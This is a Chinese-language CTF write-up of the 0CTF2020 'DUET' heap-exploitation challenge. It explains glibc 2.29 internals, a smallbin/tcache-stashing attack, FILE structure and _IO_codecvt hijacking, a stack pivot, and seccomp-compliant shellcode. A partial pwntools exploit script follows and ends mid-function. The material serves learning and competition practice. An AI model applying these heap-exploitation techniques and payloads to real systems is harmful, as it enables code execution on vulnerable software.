---
typora-copy-images-to: picture
---

# 0CTF2020  Writeup

# 1. DUET

## 1. 题目分析

菜单题，只不过将程序逻辑与古代乐器关联了起来。程序逻辑很清楚，有 add，delete，show ，magic 四个功能。

全程使用 calloc，在 magic 中有一次越界写，可以越界 1 byte。

程序可以申请的 chunk 大小范围为：0x80~0x400。

运行环境为 `ubutn 19.04` , libc-2.29

使用了 seccomp，具体限制如下

```c++
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019
 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019
 0007: 0x15 0x0b 0x00 0x00000003  if (A == close) goto 0019
 0008: 0x15 0x0a 0x00 0x00000009  if (A == mmap) goto 0019
 0009: 0x15 0x09 0x00 0x0000000a  if (A == mprotect) goto 0019
 0010: 0x15 0x08 0x00 0x0000000c  if (A == brk) goto 0019
 0011: 0x15 0x07 0x00 0x0000000f  if (A == rt_sigreturn) goto 0019
 0012: 0x15 0x06 0x00 0x0000003c  if (A == exit) goto 0019
 0013: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0019
 0014: 0x15 0x00 0x05 0x00000002  if (A != open) goto 0020
 0015: 0x20 0x00 0x00 0x0000001c  A = args[1] >> 32
 0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020
 0017: 0x20 0x00 0x00 0x00000018  A = args[1]
 0018: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
```

## 2. 利用方法

利用 magic 函数（其实就是 off-by-one）来达到 chunk 的 overlap。然后泄露堆和 libc 地址，这里需要注意的一点就是 calloc 不从 tcache 中取，也就是说我们在使用过程中不用考虑 tcache 的相关攻击方法了。

### 2.1 leak address

首先通过不断申请释放填满 tcache，然后通过 magic 函数改写下一个 chunk 的 size 字段扩大该 chunk 的大小。这样可以将该 chunk 扩大为大于 0x400，然后释放后就将以在堆中存在 libc 地址。这里为了方便后续利用，我们还需要泄露出来要给 heap 地址，具体方法就是先将一个固定大小的 tcache 填满，然后再释放了一个改大小的 chunk，这样 unsortedbin 中就有两个 chunk，就可以一次读到 heap 和 libc。

```python
  for i in range(7):
    add(0x80,'a'*0x80,0)
    delete(0)

  for i in range(6):
    add(0xa0,'a'*0xa0,0)
    delete(0)

  for i in range(7):
    add(0x370,'a'*0x370,0)
    delete(0)

  for i in range(7):
    add(0x1f0,'a'*0x1f0,0)
    delete(0)

  add(0x1f0,'a'*0x1f0,0)
  add(0x90,'a'*0x90,1)
  delete(1)
  add(0x80,'a'*0x80,1)
  delete(0)
  add(0x400,'b'*0x400,0)
  delete(1)

  add(0x140,'a'*0x140,1)
  delete(1)
  #add(0x100,'a'*0x100,0)
  #delete(0)

  payload = (p64(0) + p64(0x21))*0x40
  add(0x400,payload,1)
  oob_once(0xf1)
  delete(0)
  add(0x300,'c'*0x300,0)
  delete(0)
  payload = 'c'*0xf0 + p64(0) + p64(0x381)
  payload = payload.ljust(0x120,'\x00')
  add(0x120,payload,0)
  delete(1)
  show(0)
  ru('\xe7\x90\xb4\x3a\x20')
  rv(0x100)
  heap_addr = u64(rv(8))
  top_addr = u64(rv(8))
  libc.address = top_addr - 1985696
  lg('heap_addr',heap_addr)
  lg('top_addr',top_addr)
  lg('libc',libc.address)
  malloc_hook = libc.symbols['__malloc_hook']
  lg('malloc_hook',malloc_hook)
  dl_open_hook = libc.symbols['_dl_open_hook']
  lg('dl_open_hook',dl_open_hook)
  global_max_fast = libc.address + 0x1e7600
  lg('global_max_fast',global_max_fast)
  IO_list_all = libc.symbols['_IO_list_all']
  lg('IO_list_all',IO_list_all)
  system = libc.symbols['system']
  lg('system',system)
```

### 2.2 smallbin attack

造成 chunk overlop 后我们需要进行下一步利用（tcache 的利用方法都不可用），首先我们能想到的就是使用 unsortedbin attack，但让我们来康康 libc-2.29 中的部分源码

```c++
 for (;;)
  {
    int iters = 0;
    while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av))
    {
      bck = victim->bk;
      size = chunksize(victim);
      mchunkptr next = chunk_at_offset(victim, size);

      if (__glibc_unlikely(size <= 2 * SIZE_SZ) || __glibc_unlikely(size > av->system_mem))
        malloc_printerr("malloc(): invalid size (unsorted)");
      if (__glibc_unlikely(chunksize_nomask(next) < 2 * SIZE_SZ) || __glibc_unlikely(chunksize_nomask(next) > av->system_mem))
        malloc_printerr("malloc(): invalid next size (unsorted)");
      if (__glibc_unlikely((prev_size(next) & ~(SIZE_BITS)) != size))
        malloc_printerr("malloc(): mismatching next->prev_size (unsorted)");
      if (__glibc_unlikely(bck->fd != victim) || __glibc_unlikely(victim->fd != unsorted_chunks(av)))
        malloc_printerr("malloc(): unsorted double linked list corrupted");
      if (__glibc_unlikely(prev_inuse(next)))
        malloc_printerr("malloc(): invalid next->prev_inuse (unsorted)");

```

我们可以看到再从 unsortedbin 中取 chunk 前加入了更多的检查，其中比较致命的是对双向链表指针进行了检查，这直接封死了利用 unsortedbin 进行 attack 的可能性。

那么有没有什么方法可以取代 unsortedbin attack 呢？答案是肯定的，具体取代方法可以参考该链接：[glibc2.29下 unsortedbin_attack 的替代方法](https://zhuanlan.zhihu.com/p/142801582)

我们在这里重点介绍一种利用 smallbin 来达到与 unsortedbin attack 相似效果的方法。

我们首先看下面代码

```c++
if (in_smallbin_range(nb))
{
    idx = smallbin_index(nb);
    bin = bin_at(av, idx);

    if ((victim = last(bin)) != bin)
    {
      bck = victim->bk;
      if (__glibc_unlikely(bck->fd != victim))
        malloc_printerr("malloc(): smallbin double linked list corrupted");
      set_inuse_bit_at_offset(victim, nb);
      bin->bk = bck;
      bck->fd = bin;

      if (av != &main_arena)
        set_non_main_arena(victim);
      check_malloced_chunk(av, victim, nb);
#if USE_TCACHE
      /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
      size_t tc_idx = csize2tidx(nb);
      if (tcache && tc_idx < mp_.tcache_bins)
      {
        mchunkptr tc_victim;

        /* While bin not empty and tcache not full, copy chunks over.  */
        while (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last(bin)) != bin)
        {
          if (tc_victim != 0)
          {
            bck = tc_victim->bk;
            set_inuse_bit_at_offset(tc_victim, nb);
            if (av != &main_arena)
              set_non_main_arena(tc_victim);
            bin->bk = bck;
            bck->fd = bin;

            tcache_put(tc_victim, tc_idx);
          }
        }
      }
#endif
      void *p = chunk2mem(victim);
      alloc_perturb(p, bytes);
      return p;
    }
}
```

当我们申请的 chunk 大小大于 fastbin 但小于 largebin 时，会先考虑从 smallbin 链表中取（对应 smallbin 中有空闲 chunk）。但是这里就出现了一个问题，libc 只对从 smallbin 链表中取出来的第一个 chunk 做了检查：check victim 的 bk 指针指向 chunk 的 fd 是否能够指回来

```c++
idx = smallbin_index(nb);
bin = bin_at(av, idx);

if ((victim = last(bin)) != bin)
{
    bck = victim->bk;
    if (__glibc_unlikely(bck->fd != victim))
    malloc_printerr("malloc(): smallbin double linked list corrupted");
```

但在加入 tcache 机制后，当我们取出第一个 chunk 后，会将该 smallbin 链表中的剩余 chunk 都放入 tcache 对应的链表中

```c++
#if USE_TCACHE
/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */
size_t tc_idx = csize2tidx(nb);
if (tcache && tc_idx < mp_.tcache_bins)
{
    mchunkptr tc_victim;

    /* While bin not empty and tcache not full, copy chunks over.  */
    while (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last(bin)) != bin)
    {
        if (tc_victim != 0)
        {
            bck = tc_victim->bk;
            set_inuse_bit_at_offset(tc_victim, nb);
            if (av != &main_arena)
                set_non_main_arena(tc_victim);
            bin->bk = bck;
            bck->fd = bin;

            tcache_put(tc_victim, tc_idx);
        }
    }
```

而此时并没有对取出 chunk 的双向链表指针进行检查，因此我们可以伪造 chunk 的 bk 指针，然后利用下面的代码（`bck->fd = bin`）在任意地址写入一个 libc 地址。但这里我们需要注意 2 个问题：

1. 绕过 smallbin 的检查。这个很简单，smallbin 的检查方法为取出 chunk->bk 指向 chunk（其实就是我们的 fake_chunk）的 fd 指针要等于 chunk 的地址。因此我们可以直接伪造 fake_chunk->fd = addr_of_chunk 就可以了。

2. 从 smallbin 中取出 chunk 并放入到对应 tcache 中是一个循环遍历的过程，第一个 chunk 当然没有什么问题，但当我们遍历到第二个 chunk 时，由于我们伪造了第一个 chunk 的 bk 指针（这里我们假设我们想写的地址为 addr，则 fake_chunk->bk = addr - 0x10），那么就存在下列关系

   ```c++
   tc_victim = fake_chunk->bk = addr - 0x10
   bck = tc_vitcim->bk = *(addr - 0x10 + 0x18) = *(addr + 8)
   bck->fd = bin ->  *(*(addr + 8) + 0x10) = libc 
   ```

   也就是说我们还需要保证我们要写的地址 addr + 8 的地方存储的也是一个可写的地址，不然就会触发 `segment fault`，但这一点显然难以达到。那么有没有什么方法可以绕过呢？

   当然可以，直接退出 while 循环不就可以了。因此我们需要首先在对应大小的 tcache 中填入 6 个 chunk，然后在 smallbin 中放入 2 个。这样当我们从 smallbin 中取出一个 chunk（正常）作为分配，另一个 chunk（伪造）触发漏洞并放入 tcache。此时 tcache 中就有 7 个 chunk，自然可以退出循环。

那么我们如何实现在 tcache 中填充 6 个 chunk 的同时，在 smallbin 中还有 2 个 chunk？

方法就是，利用 unsortedbin 和 last_remainder。我们知道如果当前 unsortedbin 中只有一个 chunk 时，且该 chunk 满足我们的分配需求，则会对该 chunk 进行切割处理（例如：假设 unsortedbin 中的 chunk 大小为 0x420，我们分配 0x320 大小的 chunk 后，此时 unsortedbin 中就只剩一个 0x100 大小的 chunk），并将切割后的 chunk 继续链入 unsortedbin 中。如果此时我们申请一个大于该 chunk 大小（0x100）的请求，那么该 chunk 就会被链入对应的 bin 链表（smallbin 或 largebin）中。这样我们就成功的将一个 chunk 放入到了 smallbin 中而不是 tcache 中，此时我们再通过 chunk 的 overlap 对 smallbin 中的 chunk 进行覆写，就能达到我们的目的。

**注：至于现在 smallbin 中是 1 个 chunk 而不是 2 个的问题，其实有两种解决方法：1）在之前先使用这种方法搞一个进去，然后再搞一个并编辑这一个；2）都已经能编辑 smallbin 中的 chunk 了，把当前这个当作正常的，然后编辑它的 bk，让其指向一个在堆中的伪造 chunk 不就行了。**

**我们对 smallbin attack 的利用过程的关键点总结如下：**

1. 我们首先应该知道 smallbin 是先进先出（FIFO）策略
2. smallbin attack 利用方法的关键点，堆块布局：某 size 的 chunk，在 tcache 中有 6 个，在 smallbin 中有 2 个，并且 smallbin 中的 2 个 chunk 满足先加入的是一个正常 chunk（normal_chunk），第二个 chunk（fake_chunk） 的 bk 指针被我们伪造为我们想写的地址减去 0x10 的值，fd 指针伪造为 normal_chunk 地址
3. smallbin attack 的攻击结果：在任意地址可以写入一个 libc 的值

### 2.3 修改 global_max_fast

当我们有任意地址写的能力后，我们需要考虑要去写哪里？优先可以考虑以下几个地址（**global_max_fast**，**dl_open_hook**，**io_list_all**）。

其中我们优先考虑修改 global_max_fast，为什么这样做呢？主要是因为我们只有一次任意地址写的能力，如果我们用来写 dl_open_hook 或者 io_list_all，那么之后将无法进行利用。但如果我们修改 global_max_fast，那么我们还可以利用 free chunk 来对其他地址进行改写（具体改写原理这里不进行讨论）。

我们通过布局造成在堆里存在两个相邻的 chunk，并且这两个 chunk 发生重叠。此时我们可以通过不断申请释放第一个 chunk 来修改第二个 chunk 的 size 字段，然后再释放第二个 chunk 来对我们想要改写的地址进行修改（写入一个堆地址）。

这里插入一个小知识，对于去除了符号的 libc，我们如何取找到 global_max_fast 的 offset 呢？

具体方法是通过 **malloc_trim()** 函数

<img src=".\picture\image-20200630201614126.png" alt="image-20200630201614126" style="zoom:100%;" />

我们可以注意两个标识，其中一个是 malloc_initialized 初始化的标志，另一个是 ptmalloc_init() 函数。我们进入 ptmalloc_init() 函数

<img src=".\picture\image-20200630201828517.png" alt="image-20200630201828517" style="zoom:100%;" />

我们注意标黄的两个位置，这两个位置一个就是 dl_open_hook，另一个就是 global_max_fast

### 2.4 修改 io_list_all

在改写了 global_max_fast 后，我们就可以通过 free chunk 对大于 main_arena + 0x10（fastbinsY） 之后的地址进行修改。此时我们考虑去覆写 io_list_all，因为当程序退出时会调用 exit，此时会调用 _IO_flush_all_lockp() 函数对 io_list_all 指向的流进行刷新。

我们来看看 _IO_flush_all_lockp() 函数

```c++
int _IO_flush_all_lockp(int do_lock)
{
    ......
  	for (fp = (FILE *)_IO_list_all; fp != NULL; fp = fp->_chain)
  	{
    	run_fp = fp;
    	if (do_lock)
      		_IO_flockfile(fp);
        if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) || 
             (_IO_vtable_offset(fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)))
            && _IO_OVERFLOW(fp, EOF) == EOF)
      		result = EOF;
	......
    }
    ......
	return result;
}
```

我们重点关注该函数会调用在满足一定条件下，会调用 FILE_IO 虚表中 overflow 函数，该函数在虚表中的偏移为 0x18。那么需要满足的条件是什么呢？两组条件满足任意之一即可

- `fp->_mode <= 0 && fp->_IO_write_ptr > fp_IO_write_base`
- `fp->_mode > 0 && fp->_vtable_offset = 0 && fp->_wide_data->_IO_write_ptr > fp_write_data->_IO_write_base`

简单点来说就是 IO 中还有数据没有输出（是单字节流还是宽字节流），那么就调用 _IO_OVERFLOW，因此我们只要能够伪造 FILE_IO 的虚表指针，那么就可以劫持控制流了。

但这里存在一个问题，再没有修改掉 dl_open_hook 时是不能直接写 FILE_IO 的虚表指针的。在 libc2.27 之前我们还能通过利用 _IO_str_overflow 和 _IO_str_finish 来在不修改虚表指针的情况下控制 RIP，但这在 libc2.28 之后已经不可再利用。那么我们此时就有两种方法来劫持控制流。

### 2.5 修改 dl_open_hook

可以通过 free chunk 来修改 dl_open_hook，但在 free 前需要先进行布局（在 chunk + fake_size 后面布局占位的 chunk，使得通过 libc 的检查），然后修改虚表指针到我们伪造的虚表的位置。

该方法未验证。。。

### 2.6 利用 _IO_codecvt 虚表指针

```c++
0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
......
0x82  _vtable_offset
......
0x98  _codecvt
0xa0  _wide_data
......
0xd8  vtable
```

FILE_IO + 0x98 的位置保存了 _codecvt 结构体的指针，该结构体的成员变量如下所示：

```c++
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};
```

可以看到该成员变量中共有 7 个函数指针，如果我们能够伪造该结构体，并且想办法让程序能够调用该结构体中的函数指针，那么我们就可以劫持控制流。因此，现在问题就成了我们是否有办法可以找到一条调用该虚表指针的路径？答案当然是可以，而且存在很多条利用路径，这里我们只介绍以下两种。

#### 2.6.1 _IO_wfile_sync()

```c++
wint_t _IO_wfile_sync(FILE *fp)
{
  ssize_t delta;
  wint_t retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if (_IO_do_flush(fp))
      return WEOF;
  delta = fp->_wide_data->_IO_read_ptr - fp->_wide_data->_IO_read_end;
  if (delta != 0)
  {
    struct _IO_codecvt *cv = fp->_codecvt;
    off64_t new_pos;
    int clen = (*cv->__codecvt_do_encoding)(cv);
    if (clen > 0)
      delta *= clen;
    else
    {
      int nread;

      fp->_wide_data->_IO_state = fp->_wide_data->_IO_last_state;
      nread = (*cv->__codecvt_do_length)(cv, &fp->_wide_data->_IO_state,
                                         fp->_IO_read_base,
                                         fp->_IO_read_end, delta);
      fp->_IO_read_ptr = fp->_IO_read_base + nread;
      delta = -(fp->_IO_read_end - fp->_IO_read_base - nread);
    }
	......
  }
  ......
}
libc_hidden_def(_IO_wfile_sync)
```

可以看到其中调用了 `__codecvt_do_length`，`__codecvt_do_encoding` 两个函数指针。其实 _IO_do_flush() 函数中也会调用，我们下面介绍。至于如何走到该路径，其实也很简单，我们是要将 FILE_IO 的函数虚表修改为 &\_IO\_wfile\_sync-0x18，然后设置 FILE_IO 的相关字段绕过检查即可。

#### 2.6.2 _IO_file_sync()

这里我们会具体介绍如何利用 \_IO\_file\_sync() 来劫持程序控制流。

**注：下面函数中不关心的内容我们暂且不看。**

可以看到当满足 `fp->_IO_write_ptr > fp->_IO_write_base` 时，会调用 **_IO_do_flush()** 函数

```c++
int _IO_new_file_sync(FILE *fp)
{
  ssize_t delta;
  int retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp->_IO_write_ptr > fp->_IO_write_base)
    if (_IO_do_flush(fp))
      return EOF;
  ......
  return retval;
}
libc_hidden_ver(_IO_new_file_sync, _IO_file_sync)
```

**1）_IO_do_flush()**

首先我们来看一下 _IO_do_flush() 函数的处理逻辑。

```c++
#define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))
```

可以看到这是一个宏定义，通过判断当前流时单字节还是宽字节（_f->mode），来决定是调用 _IO_do_write() 还是 _IO_wdo_write()。其中 _IO_do_write() 函数没什么好说的了，正常的 IO 流输出函数，我们重点来看看 **\_IO\_wdo\_write()** 函数。

**2）_IO_wdo_write()**

```c++
int _IO_wdo_write(FILE *fp, const wchar_t *data, size_t to_do)
{
  struct _IO_codecvt *cc = fp->_codecvt;

  if (to_do > 0)
  {
    // 需要绕过该检查
    if (fp->_IO_write_end == fp->_IO_write_ptr && fp->_IO_write_end != fp->_IO_write_base)
    {
      if (_IO_new_do_write(fp, fp->_IO_write_base,
                           fp->_IO_write_ptr - fp->_IO_write_base) == EOF)
        return WEOF;
    }
    do
    {
      ......
      /* Now convert from the internal format into the external buffer.  */
      result = (*cc->__codecvt_do_out)(cc, &fp->_wide_data->_IO_state,
                                       data, data + to_do, &new_data,
                                       write_ptr,
                                       buf_end,
                                       &write_ptr);

      ......
    } while (to_do > 0);
  }
  ......
  return to_do == 0 ? 0 : WEOF;
}
libc_hidden_def(_IO_wdo_write)
```

我们重点关注一下几点：

1. 我们可以看到该函数中有一处虚函数调用（🤩，这不正是我们想找的东西吗）

   ```c++
   struct _IO_codecvt *cc = fp->_codecvt;
   result = (*cc->__codecvt_do_out)(cc, &fp->_wide_data->_IO_state,
                                          data, data + to_do, &new_data,
                                          write_ptr,
                                          buf_end,
                                          &write_ptr);
   ```

   在 \_IO\_do\_write() 中调用了 fp->\_codecvt->\_\_codecvt\_do\_out()，因此我们需要伪造 FILE_IO 的 _codecvt 字段来劫持控制流

2. 下面，我们具体来看看如何才能走到该路径

   - 首先 ` if(to_do>0)`，结合函数调用时传入的参数我们可以知道 `to_do = fp->_wide_data->_IO_write_ptr - fp->_wide_data->_IO_write_base)`。也就是说我们需要伪造一个 **_IO_wide_data** 结构体，让 `fake_wide_data->_IO_write_ptr > fake_wide_data->_IO_write_base`
   - `fp->_IO_write_ptr != fp->_IO_write_base`，否则将进入下面的 if 语句，直接返回

3. 调用 codecvt 的 __codecvt_do_out 虚表函数指针劫持控制流

### 2.7 stack pivot（magic，magic，magic）

此时虽然已经可以劫持控制流，但我们只有一次执行任意地址指令的机会，通常情形下我们会直接调用 one_gadget 执行 exec，但我们由前面的题目描述中可以知道程序开启了 seccomp，因此我们必须想一种能够持续劫持控制流的方法。

我们首先想到的就是栈劫持（也可以叫做栈迁移），但做栈迁移的前提是我们必须能够控制 rsp 或者控制 rbp，通过 leave_ret 指令来劫持 rsp。但当我们调用 codecvt 的虚表指针 __codecvt_do_out 时，此时 rbp 仍旧指向真正的栈地址。因此我们必须找到一个 magic 代码片段能够修改 rbp 的值。

我们看如下函数

```c++
__int64 __fastcall sub_14BC60(__int64 a1)
{
  __int64 v1; // rbx
  void (__fastcall *v2)(signed __int64); // rax

  v1 = *(_QWORD *)(a1 + 16);
  if ( *(_DWORD *)(v1 + 4) )
    close(*(_DWORD *)v1);
  v2 = *(void (__fastcall **)(signed __int64))(*(_QWORD *)(v1 + 0xD0) + 0x38LL);
  if ( v2 )
    v2(v1 + 0xC8);
  j_free(v1);
  return j_free(a1);
}
```

直接看该函数发现并没有什么特殊的地方，有一次虚表调用（其中虚表地址我们可控），可以方便我们继续劫持控制流。我们来看看该函数的汇编形式

<img src=".\picture\image-20200703091726757.png" alt="image-20200703091726757" style="zoom:100%;" />

可以看到函数一开头就有一句 `mov rbp, rdi` (￣▽￣)。rdi 我们可控啊（rdi 指向 FILE_IO 的 codecvt 字段），也就是说我们只要找到一条路径能够走到 `call rax`，且该条路径上不会修改 rbp 寄存器的值，那么我们就能即改变了 rbp，还能再次劫持控制流。下面我们来看看如何才能正确走到虚表调用且不改变 rbp 的值。

- 首先 rdi + 0x10 保存了一个未知结构的指针（struct_unk)，struct_unk +  4 保存了一个标志位，该标志为不能为 0
- struct_unk + 0xd0 保存了虚表指针，最后会调用该虚表中的第 8 个虚表函数（+0x38）

 因此我们可以按照如下方式伪造 struct_unk

```c++
struct_unk{
	+0x4 DWORD flag:1
	+0xd0 QWORD vtable
}
vtable + 0x38: leave_ret
```

**注：我们可以利用该方法，在控制 rdi 且 rdi 指向内容也可控的情况下，修改 rbp 并再次劫持控制流**

### 2.8 关于 leave_ret 指令的选择

在实际调试的时候我们可以发现，我们不能简单的选择 leave_ret 指令，因为当前 rbp 后边的值我们已经用来做其他的事了，所以我们需要选择一个类似于如下的指令：

```assembly
leave
add rsp, xxx
ret
```

但我们搜索 libc 的地址空间并没有发现形如上的指令序列，我们换一种思路。因为我们知道 `pop` 指令就相当于 `add rsp, 8`，那么有没有如下所示的指令呢？

```asm
leave
pop rxx
pop rxx
...
ret
```

很幸运我们找到了下面一个指令片段

```assembly
leave
xor eax, eax
pop rbx
pop rbp
pop r12
ret
```

至此我们基本已经完成了整个利用（栈迁移 + 劫持控制流）

### 2.9 关于 pwntool 中 shellcraft 的一些利用技巧

当我们完成栈迁移后，首先要做的事就是调用 mprotect 改变当前栈为可读可写可执行，然后执行 shellcode。

由 seccomp 我们可以知道，我们需要通过 open-read-write 来输出 flag，一般我们是直接通过手撸 shellcode 来 open-read-write（手撸也能简单）。这里我们介绍一种如何通过 pwntools 中的 shellcraft 模块来写 shellcode 的方法。

shellcraft 是 pwntools 提供的一个关于不同平台下 shellcode 编写的模板，我们可以通过调用 shellcraft 快速编写我们想要调用的 shellcode。一般使用方法为 shellcraft.platform.os.func，其中 platform 为我们当前的指令集类型（amd64，i386，mips，arm 等），os 为操作系统（linux，windows 等），func 就为我们真正想要执行的功能。具体使用方法可以参考下面链接中关于 shellcodecraft 一节。

链接：[shellcraft](C:\study\ctf\pwntoolsdocinzh-cn-readthedocs-io-en-latest.pdf)

下面是我们这次使用 shellcode

```python
shellcode = shellcraft.amd64.pushstr('flag')
shellcode += '''
mov rdi,rsp
xor rsi,rsi
mov rax,2
syscall
'''
shellcode += shellcraft.amd64.linux.read(3,'rdi',0x100)
shellcode += shellcraft.amd64.linux.write(1,'rsp',0x100)
```

## 3. 完整 exp

```python
from pwn import *
from ctypes import *
import os
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import struct
#import roputils as rop

remote_addr = "pwnable.org"
remote_port = 12020

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 1

pc = './chall'
pwn_elf = ELF(pc)

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
    print "haha2"
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): 
              os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    print path
    return ELF(path)


def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct


if uselibc == 2:
  context.arch = "amd64"
else:
  context.arch = "i386"

if uselibc ==2 and haslibc == 0:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
else:
  if uselibc == 1 and haslibc == 0:
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
  else:
    libc = ELF('./libc.so.6')

if local == 1:
  if haslibc:
    elf = change_ld(pc, './ld.so')
    p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
    #p = process(pc,env={'LD_PRELOAD':'./libc.so.6'}) 
  else:
    p = process(pc)
elif local == 0:
  p = remote(remote_addr,remote_port)
  if haslibc:
    libc = ELF('./libc.so.6')

context.log_level = True

if local:
  if atta:
    #gdb.attach(p,'b *0x00000000001142F6 + 0x555555554000\n b*0x00000000001147D2 + 0x555555554000\n b*0x000000000011432B+0x555555554000')
    #gdb.attach(p,'b *0x00000000001147A3+0x555555554000\n b*0x00000000001147B5+0x555555554000')
    gdb.attach(p,'b *0x555555554000+0x1866\n b *0x555555554000+0x19da\n b *0x7ffff7de1000+0x117590')


def sla(a,b):
  p.sendlineafter(a,b)

def sa(a,b):
  p.sendafter(a,b)

def ru(a):
  return p.recvuntil(a)

def rl():
  return p.recvline()

def rv(a):
  return p.recv(a)

def sn(a):
  p.send(a)

def sl(a):
  p.sendline(a)

def lg(s,addr):
  print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def add(size,content,idx):
  sla(': ','1')
  if idx == 0:
    sla('Instrument: ','\xe7\x90\xb4')
  else:
    sla('Instrument: ','\xe7\x91\x9f')
  sla('Duration: ',str(size))
  sa('Score: ',content)

def delete(idx):
  sla(': ','2')
  if idx == 0:
    sla('Instrument: ','\xe7\x90\xb4')
  else:
    sla('Instrument: ','\xe7\x91\x9f')


def show(idx):
  sla(': ','3')
  if idx == 0:
    sla('Instrument: ','\xe7\x90\xb4')
  else:
    sla('Instrument: ','\xe7\x91\x9f')

def oob_once(data):
  sla(': ','5')
  ru('\xe5\x90\x88\x3a\x20')
  sl(str(data))

def hack():
  raw_input()
  for i in range(7):
    add(0x80,'a'*0x80,0)
    delete(0)

  for i in range(6):
    add(0xa0,'a'*0xa0,0)
    delete(0)

  for i in range(7):
    add(0x370,'a'*0x370,0)
    delete(0)

  for i in range(7):
    add(0x1f0,'a'*0x1f0,0)
    delete(0)

  add(0x1f0,'a'*0x1f0,0)
  add(0x90,'a'*0x90,1)
  delete(1)
  add(0x80,'a'*0x80,1)
  delete(0)
  add(0x400,'b'*0x400,0)
  delete(1)

  add(0x140,'a'*0x140,1)
  delete(1)
  #add(0x100,'a'*0x100,0)
  #delete(0)

  payload = (p64(0) + p64(0x21))*0x40
  add(0x400,payload,1)
  oob_once(0xf1)
  delete(0)
  add(0x300,'c'*0x300,0)
  delete(0)
  payload = 'c'*0xf0 + p64(0) + p64(0x381)
  payload = payload.ljust(0x120,'\x00')
